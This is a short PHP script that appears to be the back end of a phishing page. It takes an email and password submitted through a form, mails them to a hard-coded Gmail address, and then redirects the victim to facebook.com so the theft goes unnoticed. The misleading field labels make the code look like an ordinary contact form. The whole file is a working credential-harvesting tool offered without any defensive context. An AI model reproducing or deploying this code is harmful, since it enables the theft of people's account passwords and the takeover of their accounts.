
<?php
// Set the recipient email addresses
$recipients = ['godwinzeozard@gmail.com'];

// Get the form input
$text = $_POST['email'];
$password = $_POST['password'];
$message = $_POST['message'];

// Set the email subject and message body
$subject = 'New Form Submission';
$message_body = "Name: $text\nEmail: $password\nMessage:\n$message";

// Send the email to each recipient
foreach ($recipients as $recipient) {
  mail($recipient, $subject, $message_body);
}

// Redirect the user back to the form
header('Location:https://facebook.com');
exit;
?>